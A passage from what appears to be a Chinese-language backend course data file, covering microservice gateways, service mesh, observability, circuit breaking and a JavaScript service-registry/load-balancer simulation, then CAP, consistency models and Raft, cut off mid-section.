5. **请求聚合**：一个请求聚合多个后端服务响应
6. **灰度发布**：按 Header/Cookie/IP 路由到不同版本
7. **日志监控**：统一请求日志、指标采集

### 15.2 网关选型

| 网关 | 语言 | 特点 |
|------|------|------|
| Nginx | C | 高性能，配置式 |
| Kong | Lua/OpenResty | 插件丰富 |
| APISIX | Lua/OpenResty | 动态路由，高性能 |
| Spring Cloud Gateway | Java | Spring 生态集成 |
| Zuul 2 | Java | Netflix 出品 |
| Envoy | C++ | Service Mesh 数据面 |
| Traefik | Go | 云原生，自动服务发现 |

### 15.3 网关高可用

1. 多节点部署 + 负载均衡（LVS/Nginx）
2. 无状态设计，Session 外置
3. 配置中心动态推送
4. 限流防雪崩
5. 灰度发布降低风险

### 15.4 网关 vs BFF

BFF（Backend for Frontend）：为每个前端定制后端聚合层。
- 移动端 BFF：轻量响应，减少请求次数
- Web BFF：完整数据，SSR 支持
- 第三方 BFF：标准化 API，限流计量

网关是基础设施层，BFF 是业务层。两者可配合使用。

## 十六、Service Mesh 服务网格

### 16.1 Service Mesh 架构

Sidecar 模式：每个服务旁部署一个代理（Sidecar），所有流量经过 Sidecar。

控制面（Control Plane）：
- Istio Pilot：服务发现、路由规则
- Istio Citadel：证书管理、mTLS
- Istio Galley：配置校验

数据面（Data Plane）：
- Envoy 代理：流量拦截、路由、负载均衡
- 以 Sidecar 方式部署在每个 Pod

### 16.2 Service Mesh 核心能力

1. **流量管理**：细粒度路由（按百分比、Header、权重）
2. **安全**：mTLS 双向认证、授权策略
3. **可观测性**：指标、链路追踪、访问日志
4. **弹性**：重试、超时、熔断、限流
5. **策略执行**：访问控制、配额管理

### 16.3 Service Mesh 优缺点

优点：
- 业务代码零侵入（治理逻辑在 Sidecar）
- 多语言支持（Sidecar 统一处理）
- 统一治理（路由、安全、可观测性）

缺点：
- 性能损耗（额外一跳，~1-3ms 延迟）
- 复杂度高（运维、调试困难）
- 资源消耗（每个 Pod 一个 Sidecar）
- 学习曲线陡

### 16.4 多语言 Service Mesh 对比

Istio + Envoy：最流行，功能全，Kubernetes 深度集成
Linkerd：轻量，Rust 数据面（Linkerd2-proxy），性能好
Consul Connect：HashiCorp 生态，VM 和 K8s 混合

## 十七、微服务可观测性

### 17.1 可观测性三支柱

1. **Metrics（指标）**：数值型监控数据（QPS、延迟、错误率）
2. **Logging（日志）**：事件记录，用于排查问题
3. **Tracing（追踪）**：请求链路，跨服务串联

### 17.2 指标监控

核心指标（RED 方法）：
- Rate：请求速率
- Error：错误率
- Duration：请求延迟分布（P50/P90/P99）

USE 方法（资源监控）：
- Utilization：使用率
- Saturation：饱和度
- Errors：错误数

工具链：
- Prometheus：指标采集与存储
- Grafana：可视化看板
- Alertmanager：告警

### 17.3 链路追踪

Trace-Span 模型：
- Trace：一次完整请求
- Span：一次服务调用
- Span 之间有父子关系

上下文传播：
- W3C Trace Context 标准（traceparent Header）
- B3（Zipkin 专用）

多语言 SDK：
- Java：OpenTelemetry SDK / Brave
- Go：otelgo
- Python：opentelemetry-python
- Node.js：@opentelemetry/node

### 17.4 日志聚合

日志规范：
1. 结构化日志（JSON 格式）
2. 包含 Trace ID，串联链路
3. 关键字段：timestamp, level, service, trace_id, message
4. 敏感信息脱敏

工具链：
- ELK：Elasticsearch + Logstash + Kibana
- Loki + Grafana：轻量日志方案
- Fluentd / Fluent Bit：日志采集

## 十八、微服务部署策略

### 18.1 部署方式

1. **蓝绿部署**：两套环境，切换流量
2. **金丝雀发布**：小流量验证，逐步扩大
3. **滚动更新**：逐个替换，零停机
4. **A/B 测试**：按用户特征分流

### 18.2 容器化部署

Docker + Kubernetes 已成为标准：
- Docker：容器打包，环境一致
- Kubernetes：容器编排，自动伸缩、滚动更新、服务发现
- Helm：K8s 应用包管理
- ArgoCD：GitOps 持续部署

### 18.3 多语言容器化对比

Java：Jib 构建镜像（无需 Dockerfile），多层缓存
Go：多阶段构建，scratch 基础镜像，最终镜像 < 20MB
Python：多阶段构建，slim 基础镜像
Node.js：多阶段构建，alpine 基础镜像，distroless 更安全

## 十九、微服务配置管理

### 19.1 配置中心核心功能

1. **集中管理**：所有服务配置集中存储
2. **动态推送**：配置变更实时推送到服务
3. **环境隔离**：dev/staging/prod 环境隔离
4. **版本管理**：配置变更历史，支持回滚
5. **灰度发布**：按 IP/标签/百分比灰度推送

### 19.2 主流配置中心对比

| 配置中心 | 语言 | 特点 |
|---------|------|------|
| Nacos | Java | 注册中心+配置中心一体 |
| Apollo | Java | 携程开源，功能丰富 |
| Consul | Go | KV 存储，多数据中心 |
| etcd | Go | K8s 底层，强一致 |
| Spring Cloud Config | Java | Git 后端，简单 |

### 19.3 配置热更新

配置变更后无需重启服务：
1. 配置中心推送变更事件
2. 服务监听变更，更新本地配置
3. 注入新配置到业务对象

多语言实现：
- Java：@RefreshScope 注解，Spring Cloud Bus 推送
- Go：watch channel 监听配置变更
- Python：watchdog 监听 + 回调
- Node.js：EventEmitter 通知配置更新

### 19.4 配置安全

1. 敏感配置加密存储（密钥/密码）
2. 访问权限控制（RBAC）
3. 配置变更审计日志
4. 配置回滚机制
5. 配置校验（类型/范围/格式）

## 二十、服务降级与熔断

### 20.1 熔断器模式

三种状态：
1. **Closed（关闭）**：正常请求，统计失败率
2. **Open（打开）**：失败率达到阈值，快速失败
3. **Half-Open（半开）**：试探性放行少量请求，成功则恢复

参数：
- 失败率阈值：50%
- 最小请求数：20（统计窗口内）
- 熔断时长：5s
- 半开请求数：3

### 20.2 降级策略

1. **返回默认值**：推荐列表返回热门商品
2. **返回缓存**：商品详情返回缓存数据
3. **简化逻辑**：搜索不走排序，直接返回
4. **异步化**：同步写改为异步写
5. **拒绝服务**：低优先级请求直接拒绝

### 20.3 熔断降级框架

| 框架 | 语言 | 特点 |
|------|------|------|
| Hystrix | Java | Netflix，已停止维护 |
| Resilience4j | Java | Hystrix 替代，函数式 |
| Sentinel | Java | 阿里，流控+熔断+热点 |
| opossum | Node.js | 熔断器 |
| gobreaker | Go | 熔断器 |
| pybreaker | Python | 熔断器 |

### 20.4 多语言熔断示例

Java（Resilience4j）：
- CircuitBreaker 配置 failureRateThreshold=50
- 使用 decorateSupplier 包装调用
- 状态自动转换

Go（gobreaker）：
- NewCircuitBreaker 配置 ReadyToTrip
- Execute(func) 执行受保护调用
- 通过 callback 监听状态变化

Python（pybreaker）：
- CircuitBreaker(failure_threshold=5)
- 使用 @cb 装饰器保护函数
- 支持事件监听

Node.js（opossum）：
- new CircuitBreaker(fn, options)
- fire(args) 调用
- fallback 降级处理

## 二十一、多语言微服务框架对比

### 21.1 主流框架

| 语言 | 框架 | 特点 |
|------|------|------|
| Java | Spring Cloud | 最成熟，生态丰富 |
| Java | Dubbo | RPC 框架，高性能 |
| Go | Kratos | B 站开源，微服务框架 |
| Go | go-zero | 好未来开源，代码生成 |
| Python | Nameko | 轻量 RPC |
| Python | FastAPI | 现代 Web 框架 |
| Node.js | NestJS | TypeScript，类 Spring |
| Rust | tonic | gRPC 框架 |

### 21.2 服务通信对比

Spring Cloud（Java）：OpenFeign 声明式 HTTP 客户端，注解定义接口
Dubbo（Java）：自定义 RPC 协议，TCP 长连接，高性能
Kratos（Go）：gRPC + HTTP 双协议，Protobuf 定义
NestJS（Node.js）：支持 gRPC、HTTP、WebSocket

### 21.3 选型建议

- 团队技术栈：选择团队熟悉的语言和框架
- 性能要求：Go/Rust > Java > Python > Node.js
- 生态成熟度：Java > Go > Node.js > Python > Rust
- 开发效率：Node.js > Python > Go > Java

## 二十二、微服务版本管理

### 22.1 API 版本策略

1. **URI 版本**：/api/v1/users
2. **Header 版本**：X-API-Version: 1
3. **查询参数**：?version=1
4. **Content Negotiation**：Accept: application/vnd.api.v1+json

推荐 URI 版本，简单直观。

### 22.2 兼容性原则

1. 新增字段兼容（不删除/重命名旧字段）
2. 新接口共存（不修改旧接口）
3. 废弃接口标记 Deprecated，给迁移时间
4. 文档维护版本变更日志

### 22.3 灰度发布

1. 版本路由：网关按规则路由到 v1/v2
2. 流量比例：v1 90%，v2 10%
3. 按用户：白名单用户优先体验 v2
4. 自动回滚：v2 错误率超阈值自动切回 v1

## 二十三、微服务团队组织（康威定律）

### 23.1 康威定律

康威定律：系统架构反映组织沟通结构。微服务架构需要对应的团队组织。

反康威定律：不要让组织结构决定架构，而应调整组织来匹配期望的架构。

### 23.2 团队划分

按业务领域划分团队（领域驱动）：
- 用户服务团队：负责用户注册、登录、个人信息
- 订单服务团队：负责下单、查询、取消
- 支付服务团队：负责支付、退款
- 基础设施团队：负责网关、监控、CI/CD

### 23.3 双披萨团队

亚马逊提出：团队规模不超过两个披萨能吃饱的人数（6-10 人）。

优点：
- 沟通高效
- 决策快速
- 责任清晰

### 23.4 微服务成熟度模型

| 级别 | 特征 | 描述 |
|------|------|------|
| L0 | 单体 | 传统单体应用 |
| L1 | 模块化 | 单体内模块化拆分 |
| L2 | 接口分离 | 模块间通过 API 调用 |
| L3 | 服务化 | 独立部署的微服务 |
| L4 | 自动化 | 自动伸缩、自愈、灰度 |
| L5 | 自治 | 团队全栈自治，DevOps |

---

> 下一章我们将深入分布式系统基础，理解 CAP、Raft、一致性哈希等核心理论。`,
    code: `// ============================================================
// 微服务架构 —— 服务注册中心 + 服务发现 + 负载均衡 模拟
// 实现：注册/注销/心跳/TTL 健康检查/服务发现/轮询负载均衡/
//       实例宕机自动剔除/新实例自动发现，完整生命周期演示
// ============================================================

// ---------- 服务注册中心 ----------
class ServiceRegistry {
  constructor() {
    this.services = new Map(); // serviceName -> Map(instanceId -> instanceInfo)
    this.checkInterval = null;
  }

  // 启动健康检查（定时扫描 TTL）
  startHealthCheck(intervalMs = 1000) {
    this.checkInterval = setInterval(() => this.healthCheck(), intervalMs);
    console.log(\`[注册中心] 健康检查启动（每 \${intervalMs}ms 扫描一次）\`);
  }

  stop() {
    if (this.checkInterval) clearInterval(this.checkInterval);
  }

  // 服务注册
  register(serviceName, instanceId, host, port, metadata = {}) {
    if (!this.services.has(serviceName)) {
      this.services.set(serviceName, new Map());
    }
    const instance = {
      instanceId,
      serviceName,
      host,
      port,
      address: \`\${host}:\${port}\`,
      metadata,
      registeredAt: Date.now(),
      lastHeartbeat: Date.now(),
      ttl: 3000, // 3 秒无心跳判定为下线
      healthy: true,
    };
    this.services.get(serviceName).set(instanceId, instance);
    console.log(\`[注册] \${serviceName}/\${instanceId} @ \${instance.address}\`);
    return instance;
  }

  // 注销
  deregister(serviceName, instanceId) {
    const instances = this.services.get(serviceName);
    if (instances && instances.has(instanceId)) {
      instances.delete(instanceId);
      console.log(\`[注销] \${serviceName}/\${instanceId} 已主动注销\`);
    }
  }

  // 心跳上报
  heartbeat(serviceName, instanceId) {
    const instances = this.services.get(serviceName);
    if (instances && instances.has(instanceId)) {
      const inst = instances.get(instanceId);
      inst.lastHeartbeat = Date.now();
      if (!inst.healthy) {
        inst.healthy = true;
        console.log(\`[恢复] \${serviceName}/\${instanceId} 恢复健康\`);
      }
    }
  }

  // 健康检查：TTL 超时的实例标记为不健康并剔除
  healthCheck() {
    const now = Date.now();
    for (const [serviceName, instances] of this.services) {
      for (const [id, inst] of instances) {
        if (now - inst.lastHeartbeat > inst.ttl) {
          if (inst.healthy) {
            inst.healthy = false;
            console.log(\`[剔除] \${serviceName}/\${id} 心跳超时，标记为不健康\`);
            instances.delete(id); // 剔除
          }
        }
      }
    }
  }

  // 服务发现：返回某服务的所有健康实例
  discover(serviceName) {
    const instances = this.services.get(serviceName);
    if (!instances) return [];
    return [...instances.values()].filter(i => i.healthy);
  }

  // 列出所有服务（调试用）
  listAll() {
    const result = {};
    for (const [name, instances] of this.services) {
      result[name] = [...instances.values()].map(i => ({
        id: i.instanceId, addr: i.address, healthy: i.healthy,
      }));
    }
    return result;
  }
}

// ---------- 客户端负载均衡器（轮询） ----------
class RoundRobinLoadBalancer {
  constructor(registry) {
    this.registry = registry;
    this.counters = new Map(); // serviceName -> 当前索引
  }

  // 选择一个实例（轮询）
  choose(serviceName) {
    const instances = this.registry.discover(serviceName);
    if (instances.length === 0) {
      return null; // 无可用实例
    }
    let idx = this.counters.get(serviceName) || 0;
    const chosen = instances[idx % instances.length];
    this.counters.set(serviceName, idx + 1);
    return chosen;
  }

  // 模拟调用服务
  async invoke(serviceName, request) {
    const instance = this.choose(serviceName);
    if (!instance) {
      console.log(\`  [调用失败] \${serviceName} 无可用实例\`);
      return null;
    }
    // 模拟 RPC 调用
    const result = \`响应来自 \${instance.serviceName}/\${instance.instanceId} @ \${instance.address}\`;
    console.log(\`  [调用] \${serviceName} ← \${request} → \${instance.instanceId}\`);
    console.log(\`         \${result}\`);
    return result;
  }
}

// ---------- 模拟服务实例（自动发心跳） ----------
class ServiceInstance {
  constructor(registry, serviceName, instanceId, host, port) {
    this.registry = registry;
    this.serviceName = serviceName;
    this.instanceId = instanceId;
    this.heartbeatTimer = null;
    this.alive = false;
    // 注册
    this.registry.register(serviceName, instanceId, host, port);
    this.alive = true;
    this.startHeartbeat();
  }

  startHeartbeat(intervalMs = 800) {
    this.heartbeatTimer = setInterval(() => {
      if (this.alive) {
        this.registry.heartbeat(this.serviceName, this.instanceId);
      }
    }, intervalMs);
  }

  // 模拟宕机（停止心跳）
  crash() {
    this.alive = false;
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    console.log(\`[宕机] \${this.serviceName}/\${this.instanceId} 停止心跳\`);
  }

  shutdown() {
    this.alive = false;
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    this.registry.deregister(this.serviceName, this.instanceId);
  }
}

// ============================================================
// 演示微服务完整生命周期
// ============================================================

(async () => {
  const registry = new ServiceRegistry();
  registry.startHealthCheck(1000);

  // ---------- 场景1：多实例注册 + 负载均衡 ----------
  console.log('\\n=== 场景1: 多实例注册 + 轮询负载均衡 ===');

  const order1 = new ServiceInstance(registry, 'order-service', 'order-1', '10.0.0.1', 8080);
  const order2 = new ServiceInstance(registry, 'order-service', 'order-2', '10.0.0.2', 8080);
  const order3 = new ServiceInstance(registry, 'order-service', 'order-3', '10.0.0.3', 8080);

  const lb = new RoundRobinLoadBalancer(registry);

  // 模拟 6 次调用，应该轮询到 3 个实例
  console.log('\\n调用 order-service 6 次（应轮询 3 个实例）:');
  for (let i = 1; i <= 6; i++) {
    await lb.invoke('order-service', \`请求#\${i}\`);
  }

  // ---------- 场景2：服务发现 ----------
  console.log('\\n=== 场景2: 服务发现（获取实例列表） ===');
  const instances = registry.discover('order-service');
  console.log(\`order-service 健康实例数: \${instances.length}\`);
  instances.forEach(i => console.log(\`  - \${i.instanceId} @ \${i.address}\`));

  // ---------- 场景3：实例宕机自动剔除 ----------
  console.log('\\n=== 场景3: 实例宕机 → 心跳超时自动剔除 ===');
  console.log('order-2 宕机...');
  order2.crash();

  // 等待健康检查剔除（TTL=3s，检查间隔=1s）
  console.log('等待 4 秒，健康检查应剔除 order-2...');
  await new Promise(r => setTimeout(r, 4000));

  const instancesAfterCrash = registry.discover('order-service');
  console.log(\`宕机后健康实例数: \${instancesAfterCrash.length}\`);
  instancesAfterCrash.forEach(i => console.log(\`  - \${i.instanceId} @ \${i.address}\`));

  console.log('\\n宕机后再调用 3 次（只应轮询 order-1, order-3）:');
  for (let i = 1; i <= 3; i++) {
    await lb.invoke('order-service', \`请求-灾后#\${i}\`);
  }

  // ---------- 场景4：新实例注册自动发现 ----------
  console.log('\\n=== 场景4: 新实例注册 → 自动加入负载均衡 ===');
  const order4 = new ServiceInstance(registry, 'order-service', 'order-4', '10.0.0.4', 8080);
  console.log('order-4 上线，自动注册...');

  const instancesAfterScale = registry.discover('order-service');
  console.log(\`扩容后健康实例数: \${instancesAfterScale.length}\`);

  console.log('\\n调用 4 次（应轮询 order-1, order-3, order-4）:');
  for (let i = 1; i <= 4; i++) {
    await lb.invoke('order-service', \`请求-扩容后#\${i}\`);
  }

  // ---------- 场景5：多服务并存 ----------
  console.log('\\n=== 场景5: 多服务并存 ===');
  const product1 = new ServiceInstance(registry, 'product-service', 'prod-1', '10.0.0.10', 8080);
  const pay1 = new ServiceInstance(registry, 'payment-service', 'pay-1', '10.0.0.20', 8080);

  console.log('\\n当前所有服务:');
  console.log(JSON.stringify(registry.listAll(), null, 2));

  console.log('\\n调用不同服务:');
  await lb.invoke('product-service', '查商品');
  await lb.invoke('payment-service', '发起支付');
  await lb.invoke('order-service', '查订单');

  // ---------- 清理 ----------
  console.log('\\n=== 清理：所有实例下线 ===');
  order1.shutdown();
  order3.shutdown();
  order4.shutdown();
  product1.shutdown();
  pay1.shutdown();
  registry.stop();

  console.log('\\n最终服务列表:', JSON.stringify(registry.listAll()));
  console.log('\\n=== 微服务生命周期演示完成 ===');
})();
`,
  },

  // =========================================================
  // 第三章：分布式系统基础
  // =========================================================
  {
    id: "backend-distributed",
    group: "分布式与工程化",
    icon: "🌐",
    title: "分布式系统基础",
    content: `## 分布式系统基础

**分布式系统** 是由多个独立计算机通过网络协作完成共同任务的系统。对用户而言，它像一台计算机；对开发者而言，它充满了网络不可靠、时钟不同步、节点故障等挑战。理解分布式系统的核心理论（CAP/PACELC/一致性模型）、共识算法（Raft/Paxos）、分布式 ID、一致性哈希，是构建可靠分布式应用的基础。

本章从分布式系统的根本挑战出发，深入讲解 CAP 理论、一致性模型、Raft 共识算法、分布式 ID 生成、一致性哈希等核心知识。

### 一、分布式系统的定义与挑战

#### 1.1 什么是分布式系统

**定义**：多台独立计算机通过网络通信协作，对外呈现为单一系统。

\`\`\`
分布式系统示例：
  - 分布式存储：数据分散在多个节点（如 HDFS、Cassandra）
  - 分布式计算：任务分散到多个节点（如 MapReduce、Spark）
  - 分布式数据库：数据分片+副本（如 TiDB、Spanner）
  - 微服务集群：服务分散部署（如电商微服务）
\`\`\`

**与单机系统的本质区别**：

| 维度 | 单机系统 | 分布式系统 |
|------|---------|-----------|
| 通信 | 进程内调用（纳秒级） | 网络调用（毫秒级） |
| 故障 | 整体故障或正常 | 部分节点可能故障 |
| 一致性 | 天然一致 | 需要协议保证 |
| 时钟 | 单一时钟 | 多时钟可能不同步 |
| 扩展 | 受单机限制 | 可水平扩展 |

#### 1.2 分布式系统的挑战

**挑战1：网络不可靠**

\`\`\`
消息可能：丢失、延迟、乱序、重复
  - 请求发出去了，对方没收到？（丢包）
  - 请求到了，响应丢了？（超时重试）
  - 请求延迟到？（已超时但消息还在路上）
\`\`\`

网络不可靠是分布式系统所有复杂性的根源。单机调用要么成功要么失败，网络调用还有"不知道成不成功"的第三种状态。

**挑战2：时钟不同步**

\`\`\`
节点 A 的时钟：10:00:00
节点 B 的时钟：10:00:05（快了 5 秒）
节点 C 的时钟：09:59:55（慢了 5 秒）

→ 基于"时间戳"判断事件先后？不可靠！
→ 需要逻辑时钟（Lamport Clock / Vector Clock）
\`\`\`

分布式系统不能依赖物理时钟判断事件顺序，需要逻辑时钟。

**挑战3：节点故障**

\`\`\`
节点故障类型：
  - 崩溃故障（Crash）：节点直接宕机，不再响应
  - 拜占庭故障（Byzantine）：节点返回错误结果（恶意/bug）
  - 网络分区（Partition）：节点活着但网络不通
\`\`\`

大多数分布式系统假设"崩溃故障"（非拜占庭），区块链系统需要处理拜占庭故障。

**挑战4：分布式八大谬误**

Peter Deutsch 提出的分布式八大谬误（开发者常犯的错误假设）：

1. **网络是可靠的**（实际：会丢包断连）
2. **延迟为零**（实际：毫秒级延迟）
3. **带宽是无限的**（实际：有限且波动）
4. **网络是安全的**（实际：需加密）
5. **拓扑不会变**（实际：节点增减频繁）
6. **只有一个管理员**（实际：多团队多策略）
7. **传输成本为零**（实际：序列化/反序列化有开销）
8. **网络是同构的**（实际：不同硬件不同协议）

> 一句话：分布式系统的复杂性，本质来自"网络不可靠 + 部分故障 + 无全局时钟"。

---

### 二、CAP 理论

CAP 是分布式系统最著名的理论，理解它是理解分布式系统设计的基础。

#### 2.1 CAP 三个属性

**C - Consistency（一致性）**：

所有节点在同一时刻看到相同的数据。读操作总能返回最新写入的值。

\`\`\`
强一致场景：
  用户写数据到节点 A → 同步到所有节点 → 之后任何节点读都返回最新值
  → 读取时如果有节点未同步，要等待（牺牲可用性）
\`\`\`

**A - Availability（可用性）**：

系统持续可用，每个请求都能在合理时间内收到非错误响应（不保证是最新数据）。

\`\`\`
高可用场景：
  任何节点都能响应读请求，即使它还没收到最新数据（返回旧值）
  → 不等待同步，直接返回（牺牲一致性）
\`\`\`

**P - Partition Tolerance（分区容错）**：

网络分区时系统仍能运作。

\`\`\`
网络分区：
  节点 A ←──×──→ 节点 B（网络断了，互相通信不了）
  → 系统要么拒绝服务（保 C），要么各自响应可能冲突的数据（保 A）
\`\`\`

#### 2.2 CAP 的权衡

**核心定理**：在网络分区发生时，只能在 C 和 A 之间二选一。P 是不可避免的（网络总会分区），所以实际是 CP vs AP。

\`\`\`
网络分区时：
  节点 A ←──×──→ 节点 B

  选 CP（保一致弃可用）：
    节点 A 收到写请求 → 无法同步给 B → 拒绝服务（返回错误）
    → 一致性保证，但可用性降低

  选 AP（保可用弃一致）：
    节点 A 收到写请求 → 写入本地 → 返回成功（不同步 B）
    节点 B 收到读请求 → 返回旧数据
    → 可用性保证，但数据不一致
\`\`\`

#### 2.3 CP 系统 vs AP 系统

**CP 系统（强一致性）**：

- 网络分区时拒绝服务，保证数据一致。
- 代表：Zookeeper、etcd、HBase、Spanner。
- 适用：金融、配置管理（数据不能错）。

**AP 系统（高可用性）**：

- 网络分区时继续服务，允许数据暂时不一致（最终一致）。
- 代表：Cassandra、DynamoDB、Eureka、CouchDB。
- 适用：社交、推荐、缓存（短暂不一致可接受）。

**CA 系统**：

- 理论上存在（无分区的单机系统），但分布式系统中 P 不可避免，所以没有真正的 CA 分布式系统。

#### 2.4 CAP 的常见误解

**误解1：三选二**

CAP 不是"三选二"，而是"分区时 C 和 A 二选一"。没有分区时，C 和 A 都可以满足。

**误解2：AP 就不一致了**

AP 不是"没有一致性"，而是"不强一致"。大多数 AP 系统实现"最终一致性"——分区恢复后数据最终一致。

**误解3：CP 就不可用了**

CP 是"分区时不可用"，正常情况下 CP 系统也是高可用的（多副本读写）。

#### 2.5 CAP 证明思路（简化）

\`\`\`
假设：节点 A 和 B，初始数据一致（v0）
      网络分区，A 和 B 通信不了

客户端1 → 写 A：v1
客户端2 → 读 B

  如果保证 A（可用）：B 必须响应 → 但 B 还是 v0 → 返回旧值 → 不一致 → 违反 C
  如果保证 C（一致）：B 不能返回旧值 → B 等待 A 同步 → 但网络分区 → B 无法等待 → 拒绝响应 → 违反 A

→ 分区时，C 和 A 不可兼得。
\`\`\`

---

### 三、PACELC 理论

CAP 只考虑了"分区时"的权衡，PACELC 补充了"无分区时"的权衡。

#### 3.1 PACELC 定义

\`\`\`
PACELC:
  if Partition (P): choose between A and C   → PA or PC
  Else (E):          choose between L and C   → EL or EC

  PA + EL：分区时保 A，平时保 L（延迟优先）→ Cassandra、DynamoDB
  PC + EC：分区时保 C，平时保 C（一致优先）→ Spanner、HBase
  PA + EC：分区时保 A，平时保 C → MongoDB（可配置）
\`\`\`

- **L（Latency）**：延迟
- **E（Else）**：无分区时

**意义**：即使没有分区，系统也要在"延迟"和"一致性"间权衡。强一致需要同步多副本（增加延迟），低延迟只能异步同步（牺牲一致）。

#### 3.2 主流系统的 PACELC 分类

| 系统 | PACELC | 说明 |
|------|--------|------|
| Cassandra | PA/EL | 分区保可用，平时保低延迟 |
| DynamoDB | PA/EL | 同上 |
| MongoDB | PA/EC（默认） | 可配置 |
| Spanner | PC/EC | 强一致 |
| Zookeeper | PC/EC | 强一致 |
| Redis Cluster | PA/EL | 可用优先 |

---

### 四、一致性模型

一致性模型定义了"分布式系统中多副本数据的可见性规则"。从强到弱有多种模型。

#### 4.1 强一致性（Linearizability）

**定义**：所有操作看起来是在单一节点上原子执行，读总返回最新写入的值。

\`\`\`
写 x=1（t=1）→ 写完成
读 x（t=2）→ 必须返回 1（不能返回旧值 0）

强一致要求：写一旦完成，后续任何读都能看到
\`\`\`

**实现**：同步复制（写需所有副本确认）、全局锁。

**代价**：高延迟（等待所有副本）、分区时不可用。

**适用**：金融交易、配置管理。

#### 4.2 顺序一致性（Sequential Consistency）

**定义**：所有节点看到操作的顺序一致（全局顺序），但不一定是真实时间顺序。

\`\`\`
节点 A：写 x=1, 写 x=2
节点 B：读 x

顺序一致：B 可能读到 1 或 2，但所有节点看到的顺序一致
  合法顺序：写1 → 写2 → B读(2)
  合法顺序：写2 → 写1 → B读(1)（不按时间但全局一致）
  非法：A 节点看到 写1→写2，B 节点看到 写2→写1（顺序不一致）
\`\`\`

比强一致弱：不要求按真实时间顺序，只要求全局顺序一致。

#### 4.3 因果一致性（Causal Consistency）

**定义**：有因果关系的操作保持顺序，无因果关系的操作可以乱序。

\`\`\`
A 发帖 → B 看到帖 → B 评论
  因果：评论依赖看帖，看帖依赖发帖 → 顺序必须：发帖→看帖→评论

A 发帖 P1, 同时 C 发帖 P2（无因果）
  → 不同节点可能看到不同顺序（P1 先 或 P2 先都行）
\`\`\`

**实现**：向量时钟（Vector Clock）跟踪因果关系。

#### 4.4 最终一致性（Eventual Consistency）

**定义**：如果没有新写入，所有副本最终会收敛到相同值。

\`\`\`
写 x=1 → 副本 A 立即更新 → 副本 B/C 异步同步
  读 B（同步前）→ 返回旧值 0
  读 B（同步后）→ 返回新值 1
  → 最终（无新写入时）所有副本都是 1
\`\`\`

**代价**：读取可能返回旧值（不一致窗口）。

**适用**：社交（评论）、缓存、DNS。

#### 4.5 客户端中心一致性

**读己写（Read-Your-Writes）**：客户端总能读到自己写入的值。

\`\`\`
用户 A 写 x=1 → 用户 A 读 x → 必须返回 1（不能返回旧值 0）
  → 需要"会话粘性"或"读主"
\`\`\`

**单调读（Monotonic Reads）**：客户端不会看到"倒退"的数据。

\`\`\`
用户读到 x=2 → 之后读不能返回 x=1（不能倒退）
  → 需要"读同一副本"或"读最新"
\`\`\`

**单调写（Monotonic Writes）**：同一客户端的写按顺序生效。

#### 4.6 一致性模型对比

| 模型 | 强度 | 代价 | 适用 |
|------|------|------|------|
| 强一致 | 最强 | 高延迟 | 金融 |
| 顺序一致 | 强 | 中 | 协同编辑 |
| 因果一致 | 中 | 低 | 社交 |
| 最终一致 | 弱 | 最低 | 缓存 |

**选择原则**：业务能容忍什么程度的不一致？能用弱的就不用强的（性能更好）。

---

### 五、共识算法 Raft 详解

**共识（Consensus）**：多个节点就某个值达成一致。Raft 是最易理解的共识算法，用于 etcd、Consul 等。

#### 5.1 Raft 解决什么问题

\`\`\`
问题：3 个节点，客户端写数据，如何保证所有节点数据一致？
  - 不能各自写（可能不一致）
  - 需要一个"Leader"统一处理写请求
  - Leader 挂了怎么办？需要选举新 Leader
  - 如何保证选举公平、数据不丢？

Raft 解决：Leader 选举 + 日志复制 + 安全性
\`\`\`

#### 5.2 Raft 节点状态

\`\`\`
三种状态：
  Follower（跟随者）：被动接收 Leader 的日志
  Candidate（候选人）：发起选举，竞争 Leader
  Leader（领导者）：处理客户端请求，复制日志

状态转换：
  Follower ──选举超时──→ Candidate ──获多数票──→ Leader
  Candidate ──发现Leader──→ Follower
  Candidate ──超时重选──→ Candidate
  Leader ──发现更高Term──→ Follower
\`\`\`

#### 5.3 Leader 选举

**Term（任期）**：

Raft 把时间分成"任期"，每个任期最多一个 Leader。Term 单调递增，防止旧 Leader 干扰。

**选举流程**：

\`\`\`
1. 初始所有节点都是 Follower
2. Follower 在"选举超时"内没收到 Leader 心跳 → 成为 Candidate
3. Candidate：
   a. Term + 1
   b. 给自己投票
   c. 发送 RequestVote RPC 给其他节点
4. 收到 RequestVote 的节点：
   a. 如果 Candidate 的 Term >= 自己的 Term，且还没投过票 → 投赞成票
   b. 否则拒绝
5. Candidate 获得多数票 → 成为 Leader
6. 新 Leader 定期发心跳，维持权威

随机选举超时（150-300ms）避免多个节点同时竞选：
  节点 A 超时 200ms，节点 B 超时 250ms
  → A 先超时，先成为 Candidate，先拉票 → A 当选
  → 避免瓜分选票
\`\`\`

#### 5.4 日志复制

**Leader 处理写请求的流程**：

\`\`\`
客户端 → Leader：写 x=1
  1. Leader 把 x=1 追加到本地日志（未提交）
  2. Leader 并发发 AppendEntries RPC 给所有 Follower
  3. Follower 收到 → 追加日志 → 回复 ACK
  4. Leader 收到多数 ACK → 提交日志（commit）
  5. Leader 应用到状态机（x=1 生效）
  6. Leader 返回成功给客户端
  7. Leader 下一次心跳附带 commitIndex，Follower 也提交
\`\`\`

**关键：多数派（Quorum）**

\`\`\`
5 节点集群，多数 = 3
  Leader 写日志 → 至少 2 个 Follower 确认 → 3 个节点有该日志 → 提交

  即使 2 个节点挂了，剩 3 个节点仍有该日志 → 数据不丢
\`\`\`

#### 5.5 安全性保证

**Leader 完整性**：

已提交的日志一定出现在新 Leader 的日志中。

\`\`\`
保证机制：投票时，Follower 只给"日志至少和自己一样新"的 Candidate 投票
  → 日志落后的 Candidate 拿不到票 → 不能成为 Leader
  → 新 Leader 一定包含所有已提交日志
\`\`\`

**日志匹配特性**：

如果两条日志的 index 和 term 相同，则它们之前的日志也相同。

\`\`\`
Leader 发 AppendEntries 时带"前一条日志的 index 和 term"
  Follower 检查：如果匹配 → 追加；不匹配 → 拒绝
  Leader 收到拒绝 → 回退日志 index，重发
  → 最终 Follower 与 Leader 日志一致
\`\`\`

#### 5.6 成员变更

集群扩缩容（加减节点）需要成员变更：

- **单节点变更**：一次只加/减一个节点，简单安全。
- **联合一致**：先切换到"旧+新"联合配置，再切换到新配置。

#### 5.7 Raft 多语言对照

Go (etcd raft):
\`\`\`go
n := raft.StartNode(c, peers)
n.Propose(ctx, data) // 写入
n.Tick()             // 驱动选举
n.Step(ctx, msg)     // 处理 RPC
\`\`\`

Java (Atomix):
